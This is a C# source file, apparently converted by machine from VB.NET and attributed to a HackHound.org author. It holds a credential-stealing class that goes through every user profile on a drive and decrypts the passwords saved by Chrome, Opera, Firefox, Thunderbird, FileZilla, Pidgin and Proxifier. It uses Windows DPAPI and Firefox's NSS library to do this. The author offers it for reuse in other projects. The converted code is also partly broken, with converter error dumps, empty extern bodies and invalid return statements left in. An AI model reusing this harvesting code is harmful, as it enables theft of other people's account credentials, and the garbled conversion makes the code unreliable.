@@ -1,0 +1,674 @@
+// `':,;+####;`           
+// #################        
+// ###########@#;+##'      
+// #@##########'####;      
+// :###@#++######'''++';#,  
+// ######+;;##;;;;;+';;;+#  
+// #####++####'';;;+';'''#'  
+// @######++#+++#+####++''#   
+// ######+#;'''++#+#;;+.      
+// ########;+;'+'++#           
+// .##########'+'''++++           
+// ##############+'+'++#           
+// ##################+####           
+// #########@#########+@##           
+// ###########@##########@           
+// ############@##########,          
+// 
+// Rottweiler @ HackHound.org
+// 
+// Usage:
+// Dim AC As New PREC(DriveInfo.GetDrives().FirstOrDefault())
+// AC.RecoverOpera()
+// AC.RecoverFirefox()
+// AC.RecoverChrome()
+// AC.RecoverFileZilla()
+// AC.RecoverPidgin()
+// AC.RecoverThunderbird()
+// AC.RecoverProxifier()
+// For Each Account As PREC.Account In AC.Accounts
+// Console.WriteLine(Account.ToString())
+// Next
+// 
+// Written for HackHound.org - Include in your projects, but please save credits
+// So many people to thank for some parts, mostly people from HackHound. So I'll thank the community as a whole instead!
+
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Globalization;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Security;
+using System.Text;
+using System.Threading.Tasks;
+using Microsoft.VisualBasic;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+using System.Xml;
+
+class PREC
+{
+    [DllImport("Crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    private static bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut)
+    {
+    }
+    [Flags()]
+    private enum CryptProtectPromptFlags
+    {
+        CRYPTPROTECT_PROMPT_ON_UNPROTECT = 0x1,
+        CRYPTPROTECT_PROMPT_ON_PROTECT = 0x2
+    }
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    private struct CRYPTPROTECT_PROMPTSTRUCT
+    {
+        public int cbSize;
+        public CryptProtectPromptFlags dwPromptFlags;
+        public IntPtr hwndApp;
+        public string szPrompt;
+    }
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    private struct DATA_BLOB
+    {
+        public int cbData;
+        public IntPtr pbData;
+    }
+    private string Decrypt(byte[] Datas)
+    {
+        ;/* Cannot convert OnErrorResumeNextStatementSyntax, CONVERSION ERROR: Conversion for OnErrorResumeNextStatement not implemented, please report this issue in 'On Error Resume Next' at character 2485
+   at ICSharpCode.CodeConverter.CSharp.VisualBasicConverter.MethodBodyVisitor.DefaultVisit(SyntaxNode node)
+   at Microsoft.CodeAnalysis.VisualBasic.VisualBasicSyntaxVisitor`1.VisitOnErrorResumeNextStatement(OnErrorResumeNextStatementSyntax node)
+   at Microsoft.CodeAnalysis.VisualBasic.Syntax.OnErrorResumeNextStatementSyntax.Accept[TResult](VisualBasicSyntaxVisitor`1 visitor)
+   at Microsoft.CodeAnalysis.VisualBasic.VisualBasicSyntaxVisitor`1.Visit(SyntaxNode node)
+   at ICSharpCode.CodeConverter.CSharp.CommentConvertingMethodBodyVisitor.ConvertWithTrivia(SyntaxNode node)
+   at ICSharpCode.CodeConverter.CSharp.CommentConvertingMethodBodyVisitor.DefaultVisit(SyntaxNode node)
+
+Input: 
+        On Error Resume Next
+
+ */
+        DATA_BLOB inj = new DATA_BLOB(), Ors = new DATA_BLOB();
+        GCHandle Ghandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
+        inj.pbData = Ghandle.AddrOfPinnedObject();
+        inj.cbData = Datas.Length;
+        Ghandle.Free();
+        CryptUnprotectData(ref inj, null, ref default(DATA_BLOB), default(IntPtr), ref default(CRYPTPROTECT_PROMPTSTRUCT), 0, ref Ors);
+        byte[] Returned = new byte[Ors.cbData + 1];
+        Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData);
+        string TheString = Encoding.UTF8.GetString(Returned);
+        return TheString.Substring(0, TheString.Length - 1);
+    }
+    private IntPtr NSS3;
+    private List<IntPtr> hModuleList = new List<IntPtr>();
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct TSECItem
+    {
+        public int SECItemType;
+        public int SECItemData;
+        public int SECItemLen;
+    }
+
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate long DLLFunctionDelegate(string configdir);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate long DLLFunctionDelegate2();
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate long DLLFunctionDelegate6();
+
+    private long PK11_GetInternalKeySlot()
+    {
+        return CreateAPI<DLLFunctionDelegate2>(NSS3, "PK11_GetInternalKeySlot")();
+    }
+    private long PK11_Authenticate(long slot, bool loadCerts, long wincx)
+    {
+        return CreateAPI<DLLFunctionDelegate3>(NSS3, "PK11_Authenticate")(slot, loadCerts, wincx);
+    }
+    private int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
+    {
+        return CreateAPI<DLLFunctionDelegate4>(NSS3, "NSSBase64_DecodeBuffer")(arenaOpt, outItemOpt, inStr, inLen);
+    }
+    private int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
+    {
+        return CreateAPI<DLLFunctionDelegate5>(NSS3, "PK11SDR_Decrypt")(ref data, ref result, cx);
+    }
+    private long NSS_Shutdown()
+    {
+        return CreateAPI<DLLFunctionDelegate6>(NSS3, "NSS_Shutdown")();
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    private static IntPtr LoadLibrary(string dllFilePath)
+    {
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "FreeLibrary")]
+    private static bool FreeLibrary(IntPtr hModule)
+    {
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
+    private static IntPtr GetProcAddress(IntPtr hModule, string procName)
+    {
+    }
+
+    // Private Function CreateAPI(Of T)(ByVal name As String, ByVal method As String) As T
+    // Return CreateAPI(Of T)(LoadLibrary(name), method)
+    // End Function
+
+    private T CreateAPI<T>(IntPtr hModule, string method) // Simple overload to avoid loading the same library every time
+    {
+        ;/* Cannot convert OnErrorResumeNextStatementSyntax, CONVERSION ERROR: Conversion for OnErrorResumeNextStatement not implemented, please report this issue in 'On Error Resume Next' at character 6314
+   at ICSharpCode.CodeConverter.CSharp.VisualBasicConverter.MethodBodyVisitor.DefaultVisit(SyntaxNode node)
+   at Microsoft.CodeAnalysis.VisualBasic.VisualBasicSyntaxVisitor`1.VisitOnErrorResumeNextStatement(OnErrorResumeNextStatementSyntax node)
+   at Microsoft.CodeAnalysis.VisualBasic.Syntax.OnErrorResumeNextStatementSyntax.Accept[TResult](VisualBasicSyntaxVisitor`1 visitor)
+   at Microsoft.CodeAnalysis.VisualBasic.VisualBasicSyntaxVisitor`1.Visit(SyntaxNode node)
+   at ICSharpCode.CodeConverter.CSharp.CommentConvertingMethodBodyVisitor.ConvertWithTrivia(SyntaxNode node)
+   at ICSharpCode.CodeConverter.CSharp.CommentConvertingMethodBodyVisitor.DefaultVisit(SyntaxNode node)
+
+Input: 
+        On Error Resume Next
+
+ */
+        return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, method), typeof(T));
+    }
+
+    public bool RecoverOpera()
+    {
+        try
+        {
+            foreach (string AppData in GetAppDataFolders())
+            {
+                if (!File.Exists(AppData + @"\Roaming\Opera Software\Opera Stable\Login Data"))
+                    continue;
+                SQLiteHandler sql = new SQLiteHandler(AppData + @"\Roaming\Opera Software\Opera Stable\Login Data");
+                sql.ReadTable("logins");
+                for (int i = 0; i <= sql.GetRowCount() - 1; i++)
+                {
+                    string url = sql.GetValue(i, "origin_url");
+                    string username = sql.GetValue(i, "username_value");
+                    string password_crypted = sql.GetValue(i, "password_value");
+                    string password = Interaction.IIf(string.IsNullOrEmpty(password_crypted), "", Decrypt(Encoding.Default.GetBytes(password_crypted)));
+                    Account Opera = new Account(AccountType.Opera, username, password, url);
+                    Accounts.Add(Opera);
+                }
+            }
+            return true;
+        }
+        catch (Exception e)
+        {
+            /* TODO ERROR: Skipped IfDirectiveTrivia *//* TODO ERROR: Skipped DisabledTextTrivia *//* TODO ERROR: Skipped EndIfDirectiveTrivia */
+            return false;
+        }
+    }
+    public bool RecoverChrome()
+    {
+        try
+        {
+            foreach (string AppData in GetAppDataFolders())
+            {
+                if (!File.Exists(AppData + @"\Local\Google\Chrome\User Data\Default\Login Data"))
+                    continue;
+                SQLiteHandler sql = new SQLiteHandler(AppData + @"\Local\Google\Chrome\User Data\Default\Login Data");
+                sql.ReadTable("logins");
+                for (int i = 0; i <= sql.GetRowCount() - 1; i++)
+                {
+                    string url = sql.GetValue(i, "origin_url");
+                    string username = sql.GetValue(i, "username_value");
+                    string password_crypted = sql.GetValue(i, "password_value");
+                    string password = Interaction.IIf(string.IsNullOrEmpty(password_crypted), "", Decrypt(Encoding.Default.GetBytes(password_crypted)));
+                    Account Chrome = new Account(AccountType.Chrome, username, password, url);
+                    Accounts.Add(Chrome);
+                }
+            }
+            return true;
+        }
+        catch (Exception e)
+        {
+            /* TODO ERROR: Skipped IfDirectiveTrivia *//* TODO ERROR: Skipped DisabledTextTrivia *//* TODO ERROR: Skipped EndIfDirectiveTrivia */
+            return false;
+        }
+    }
+    private string FindFirefoxInstallationPath()
+    {
+        string MozPath = string.Empty;
+        foreach (string InstalledAppsDir in GetInstalledAppsDirs())
+        {
+            foreach (string Dir in Directory.GetDirectories(InstalledAppsDir, "Mozilla Firefox", SearchOption.TopDirectoryOnly))
+            {
+                MozPath = Dir;
+                if (!string.IsNullOrEmpty(MozPath))
+                    break;
+            }
+        }
+        return MozPath;
+    }
+
+    private string FindFirefoxProfilePath(string AppDataDir)
+    {
+        string mozAPPDATA = AppDataDir + @"\Roaming\Mozilla\Firefox";
+        if (!System.IO.Directory.Exists(mozAPPDATA))
+        {
+            return string.Empty; return;
+        }
+        var mozProfile = new Regex("^Path=(.*?)$", RegexOptions.Multiline).Match(System.IO.File.ReadAllText(mozAPPDATA + @"\profiles.ini")).Groups[1].Value.Replace(Constants.vbCr, null);
+        return mozAPPDATA + @"\" + mozProfile;
+    }
+
+    private long NSS_Init(string configdir)
+    {
+        hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() + @"\msvcr100.dll"));
+        hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() + @"\msvcp100.dll"));
+        hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() + @"\msvcr120.dll"));
+        hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() + @"\msvcp120.dll"));
+        hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() + @"\mozglue.dll"));
+        NSS3 = LoadLibrary(FindFirefoxInstallationPath() + @"\nss3.dll");
+        hModuleList.Add(NSS3);
+        return CreateAPI<DLLFunctionDelegate>(NSS3, "NSS_Init")(configdir);
+    }
+
+    private void DecryptFF(string str)
+    {
+        ;/* Cannot convert OnErrorResumeNextStatementSyntax, CONVERSION ERROR: Conversion for OnErrorResumeNextStatement not implemented, please report this issue in 'On Error Resume Next' at character 10652
+   at ICSharpCode.CodeConverter.CSharp.VisualBasicConverter.MethodBodyVisitor.DefaultVisit(SyntaxNode node)
+   at Microsoft.CodeAnalysis.VisualBasic.VisualBasicSyntaxVisitor`1.VisitOnErrorResumeNextStatement(OnErrorResumeNextStatementSyntax node)
+   at Microsoft.CodeAnalysis.VisualBasic.Syntax.OnErrorResumeNextStatementSyntax.Accept[TResult](VisualBasicSyntaxVisitor`1 visitor)
+   at Microsoft.CodeAnalysis.VisualBasic.VisualBasicSyntaxVisitor`1.Visit(SyntaxNode node)
+   at ICSharpCode.CodeConverter.CSharp.CommentConvertingMethodBodyVisitor.ConvertWithTrivia(SyntaxNode node)
+   at ICSharpCode.CodeConverter.CSharp.CommentConvertingMethodBodyVisitor.DefaultVisit(SyntaxNode node)
+
+Input: 
+        On Error Resume Next
+
+ */
+        TSECItem mozSEC, mozSEC2;
+        StringBuilder sb = new StringBuilder(str);
+        int mozDecodeBuffer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
+        mozSEC = new TSECItem();
+        mozSEC2 = Marshal.PtrToStructure(new IntPtr(mozDecodeBuffer), typeof(TSECItem));
+        if (PK11SDR_Decrypt(ref mozSEC2, ref mozSEC, 0) == 0)
+        {
+            if (mozSEC.SECItemLen != 0)
+            {
+                var mozDecryptedData = new byte[mozSEC.SECItemLen - 1 + 1];
+                Marshal.Copy(new IntPtr(mozSEC.SECItemData), mozDecryptedData, 0, mozSEC.SECItemLen);
+                return Encoding.UTF8.GetString(mozDecryptedData);
+            }
+        }
+        return string.Empty;
+    }
+
+    public bool RecoverFirefox()
+    {
+        try
+        {
+            foreach (string AppData in GetAppDataFolders())
+            {
+                string mozProfilePath = FindFirefoxProfilePath(AppData);
+                if (!System.IO.Directory.Exists(mozProfilePath))
+                    continue;
+                var mozLogins = System.IO.File.ReadAllText(mozProfilePath + @"\logins.json");
+                NSS_Init(mozProfilePath);
+                long keySlot = PK11_GetInternalKeySlot();
+                PK11_Authenticate(keySlot, true, 0);
+                Regex JSONRegex = new Regex(@"\""(hostname|encryptedPassword|encryptedUsername)"":""(.*?)""");
+                var mozMC = JSONRegex.Matches(mozLogins);
+                for (var I = 0; I <= mozMC.Count - 1; I += 3)
+                {
+                    var host = mozMC[I].Groups[2].Value;
+                    var usr = mozMC[I + 1].Groups[2].Value;
+                    var pas = mozMC[I + 2].Groups[2].Value;
+                    Account Firefox = new Account(AccountType.Firefox, DecryptFF(usr), DecryptFF(pas), host);
+                    Accounts.Add(Firefox);
+                }
+                NSS_Shutdown();
+                foreach (IntPtr hModule in hModuleList)
+                    FreeLibrary(hModule);
+            }
+            return true;
+        }
+        catch (Exception e)
+        {
+            /* TODO ERROR: Skipped IfDirectiveTrivia *//* TODO ERROR: Skipped DisabledTextTrivia *//* TODO ERROR: Skipped EndIfDirectiveTrivia */
+            return false;
+        }
+    }
+    private string FindThunderbirdProfilePath(string AppDataDir)
+    {
+        string mozThunderAPPDATA = AppDataDir + @"\Roaming\Thunderbird";
+        if (!System.IO.Directory.Exists(mozThunderAPPDATA))
+        {
+            return string.Empty; return;
+        }
+        var mozProfile = new Regex("Path=(.*?)$", RegexOptions.Multiline).Match(System.IO.File.ReadAllText(mozThunderAPPDATA + @"\profiles.ini")).Groups[1].Value.Replace(Constants.vbCr, null);
+        return mozThunderAPPDATA + @"\" + mozProfile;
+    }
+    public bool RecoverThunderbird()
+    {
+        try
+        {
+            foreach (string AppData in GetAppDataFolders())
+            {
+                string mozThunderProfilePath = FindThunderbirdProfilePath(AppData);
+                if (!System.IO.Directory.Exists(mozThunderProfilePath))
+                    continue;
+                var mozLogins = System.IO.File.ReadAllText(mozThunderProfilePath + @"\logins.json");
+                NSS_Init(mozThunderProfilePath + @"\");
+                long keySlot = PK11_GetInternalKeySlot();
+                PK11_Authenticate(keySlot, true, 0);
+                Regex JSONRegex = new Regex(@"\""(hostname|encryptedPassword|encryptedUsername)"":""(.*?)""");
+                var mozMC = JSONRegex.Matches(mozLogins);
+                for (var I = 0; I <= mozMC.Count - 1; I += 3)
+                {
+                    var host = mozMC[I].Groups[2].Value;
+                    var usr = mozMC[I + 1].Groups[2].Value;
+                    var pas = mozMC[I + 2].Groups[2].Value;
+                    Account Thunderbird = new Account(AccountType.Thunderbird, DecryptFF(usr), DecryptFF(pas), host);
+                    Accounts.Add(Thunderbird);
+                }
+                NSS_Shutdown();
+                foreach (IntPtr hModule in hModuleList)
+                    FreeLibrary(hModule);
+            }
+            return true;
+        }
+        catch (Exception e)
+        {
+            /* TODO ERROR: Skipped IfDirectiveTrivia *//* TODO ERROR: Skipped DisabledTextTrivia *//* TODO ERROR: Skipped EndIfDirectiveTrivia */
+            return false;
+        }
+    }
+    public bool RecoverFileZilla()
+    {
+        try
+        {
+            foreach (string AppData in GetAppDataFolders())
+            {
+                if (System.IO.File.Exists(AppData + @"\Roaming\FileZilla\recentservers.xml"))
+                {
+                    XmlDocument x = new XmlDocument();
+                    x.Load(AppData + @"\Roaming\FileZilla\recentservers.xml");
+                    foreach (XmlNode Node in x.ChildNodes[1].SelectNodes("RecentServers/Server"))
+                    {
+                        string host = string.Format("{0}:{1}", ExtractValue(Node, "Host"), ExtractValue(Node, "Port"));
+                        string user = ExtractValue(Node, "User");
+                        string pass = ExtractValue(Node, "Pass", (Node.SelectSingleNode("Pass[@encoding='base64']") != null));
+                        Account FileZilla = new Account(AccountType.FileZilla, user, pass, host);
+                        Accounts.Add(FileZilla);
+                    }
+                    x = null;
+                }
+                else
+                    continue;
+            }
+            return true;
+        }
+        catch (Exception e)
+        {
+            /* TODO ERROR: Skipped IfDirectiveTrivia *//* TODO ERROR: Skipped DisabledTextTrivia *//* TODO ERROR: Skipped EndIfDirectiveTrivia */
+            return false;
+        }
+    }
+    public bool RecoverPidgin()
+    {
+        try
+        {
+            foreach (string AppData in GetAppDataFolders())
+            {
+                if (!System.IO.File.Exists(AppData + @"\Roaming\.purple\accounts.xml"))
+                    continue;
+                XmlDocument Doc = new XmlDocument();
+                Doc.Load(AppData + @"\Roaming\.purple\accounts.xml");
+                foreach (XmlNode Node in Doc.ChildNodes[1].SelectNodes("account"))
+                {
+                    string Domain = ExtractValue(Node, "protocol");
+                    string Username = ExtractValue(Node, "name");
+                    string Password = ExtractValue(Node, "password");
+                    Account Pidgin = new Account(AccountType.Pidgin, Username, Password, Domain);
+                    Accounts.Add(Pidgin);
+                }
+                Doc = null;
+            }
+            return true;
+        }
+        catch (Exception e)
+        {
+            /* TODO ERROR: Skipped IfDirectiveTrivia *//* TODO ERROR: Skipped DisabledTextTrivia *//* TODO ERROR: Skipped EndIfDirectiveTrivia */
+            return false;
+        }
+    }
+    /// <summary>
+    ///     ''' Recovers Proxifier Proxy list (TODO: detect/implement password cryptography algorithm)
+    ///     ''' </summary>
+    ///     ''' <returns></returns>
+    public bool RecoverProxifier()
+    {
+        try
+        {
+            foreach (string AppData in GetAppDataFolders())
+            {
+                if (!System.IO.File.Exists(AppData + @"\Roaming\Proxifier\Profiles\Default.ppx"))
+                    continue;
+                XmlDocument Doc = new XmlDocument();
+                Doc.Load(AppData + @"\Roaming\Proxifier\Profiles\Default.ppx");
+                foreach (XmlNode Node in Doc.ChildNodes[1].SelectSingleNode("ProxyList").SelectNodes("Proxy"))
+                {
+                    string IPAddress = "[" + Node.Attributes["type"].Value + "]" + ExtractValue(Node, "Address") + ":" + ExtractValue(Node, "Port");
+                    string Username = "";
+                    string Password = "";
+                    foreach (XmlNode n in Node.ChildNodes)
+                    {
+                        if (n.Name == "Authentication")
+                        {
+                            if (n.Attributes["enabled"].Value == "true")
+                            {
+                                Username = ExtractValue(n, "Username");
+                                Password = ExtractValue(n, "Password");
+                            }
+                        }
+                    }
+                    Account Proxifier = new Account(AccountType.Proxifier, Username, Password, IPAddress);
+                    Accounts.Add(Proxifier);
+                }
+                Doc = null;
+            }
+            return true;
+        }
+        catch (Exception e)
+        {
+            /* TODO ERROR: Skipped IfDirectiveTrivia *//* TODO ERROR: Skipped DisabledTextTrivia *//* TODO ERROR: Skipped EndIfDirectiveTrivia */
+            return false;
+        }
+    }
+
+    private string ExtractValue(XmlNode Node, string Key, bool DecodeBase64 = false)
+    {
+        XmlNode exNode = Node.SelectSingleNode(Key);
+        if (DecodeBase64)
+            return new UTF8Encoding().GetString(Convert.FromBase64String(exNode.InnerText));
+        else
+            return exNode.InnerText;
+    }
+    private bool isWindowsXP()
+    {
+        return (System.Environment.OSVersion.Version.Major == 5);
+    }
+    private string[] GetAppDataFolders()
+    {
+        ;/* Cannot convert OnErrorResumeNextStatementSyntax, CONVERSION ERROR: Conversion for OnErrorResumeNextStatement not implemented, please report this issue in 'On Error Resume Next' at character 19973
+   at ICSharpCode.CodeConverter.CSharp.VisualBasicConverter.MethodBodyVisitor.DefaultVisit(SyntaxNode node)
+   at Microsoft.CodeAnalysis.VisualBasic.VisualBasicSyntaxVisitor`1.VisitOnErrorResumeNextStatement(OnErrorResumeNextStatementSyntax node)
+   at Microsoft.CodeAnalysis.VisualBasic.Syntax.OnErrorResumeNextStatementSyntax.Accept[TResult](VisualBasicSyntaxVisitor`1 visitor)
+   at Microsoft.CodeAnalysis.VisualBasic.VisualBasicSyntaxVisitor`1.Visit(SyntaxNode node)
+   at ICSharpCode.CodeConverter.CSharp.CommentConvertingMethodBodyVisitor.ConvertWithTrivia(SyntaxNode node)
+   at ICSharpCode.CodeConverter.CSharp.CommentConvertingMethodBodyVisitor.DefaultVisit(SyntaxNode node)
+
+Input: 
+        On Error Resume Next
+
+ */
+        List<string> iList = new List<string>();
+        if (isWindowsXP())
+        {
+            foreach (string Dir in Directory.GetDirectories(Drive.RootDirectory.FullName + @"Documents and Settings\", "*", SearchOption.TopDirectoryOnly))
+                iList.Add(Dir + "Application Data");
+        }
+        else
+            foreach (string Dir in Directory.GetDirectories(Drive.RootDirectory.FullName + @"Users\", "*", SearchOption.TopDirectoryOnly))
+            {
+                System.IO.DirectoryInfo dirInfo = new System.IO.DirectoryInfo(Dir);
+                iList.Add(Drive.RootDirectory.FullName + @"Users\" + dirInfo.Name + @"\AppData");
+            }
+        return iList.ToArray();
+    }
+    private string[] GetInstalledAppsDirs()
+    {
+        string Apps = string.Empty;
+        List<string> iList = new List<string>();
+        foreach (string Dir in Directory.GetDirectories(Drive.RootDirectory.FullName, "Program Files*", SearchOption.TopDirectoryOnly))
+            iList.Add(Dir);
+        return iList.ToArray();
+    }
+
+
+    // Not sure how I will do this without access to registry on other drives yet!!
+    // So currently I check if login file exists inside the recovery functions
+
+    public PREC(DriveInfo Drive)
+    {
+        this.Drive = Drive;
+    }
+    public PREC()
+    {
+        foreach (DriveInfo Drive in DriveInfo.GetDrives())
+        {
+            if (Drive.RootDirectory.FullName == Path.GetPathRoot(Environment.SystemDirectory))
+            {
+                this.Drive = Drive; break;
+            }
+        }
+    }
+    private DriveInfo _drive;
+    public DriveInfo Drive
+    {
+        get
+        {
+            return _drive;
+        }
+        set
+        {
+            _drive = value;
+        }
+    }
+    private List<Account> _accounts = new List<Account>();
+    public List<Account> Accounts
+    {
+        get
+        {
+            return _accounts;
+        }
+        set
+        {
+            _accounts = value;
+        }
+    }
+}
+
+class Account
+{
+    private string _username;
+    public string Username
+    {
+        get
+        {
+            return _username;
+        }
+        set
+        {
+            _username = value;
+        }
+    }
+    private string _password;
+    public string Password
+    {
+        get
+        {
+            return _password;
+        }
+        set
+        {
+            _password = value;
+        }
+    }
+    private string _domain;
+    public string Domain
+    {
+        get
+        {
+            return _domain;
+        }
+        set
+        {
+            _domain = value;
+        }
+    }
+    private AccountType _type;
+    public AccountType Type
+    {
+        get
+        {
+            return _type;
+        }
+        set
+        {
+            _type = value;
+        }
+    }
+    public Account(AccountType Type, string Username, string Password)
+    {
+        this.Type = Type;
+        this.Username = Username;
+        this.Password = Password;
+    }
+    public Account(AccountType Type, string Username, string Password, string Domain)
+    {
+        this.Type = Type;
+        this.Username = Username;
+        this.Password = Password;
+        this.Domain = Domain;
+    }
+    public Account(AccountType Type)
+    {
+        this.Type = Type;
+    }
+    public override string ToString()
+    {
+        StringBuilder sb = new StringBuilder();
+        sb.AppendLine("PREC.Account {");
+        sb.AppendLine("Type:        " + Type.ToString());
+        sb.AppendLine("Domain:      " + Domain);
+        sb.AppendLine("Username:    " + Username);
+        sb.AppendLine("Password:    " + Password);
+        sb.AppendLine("}");
+        return sb.ToString();
+    }
+}
+
+enum AccountType
+{
+    Firefox,
+    Chrome,
+    Opera,
+    FileZilla,
+    Pidgin,
+    Thunderbird,
+    Proxifier
+}
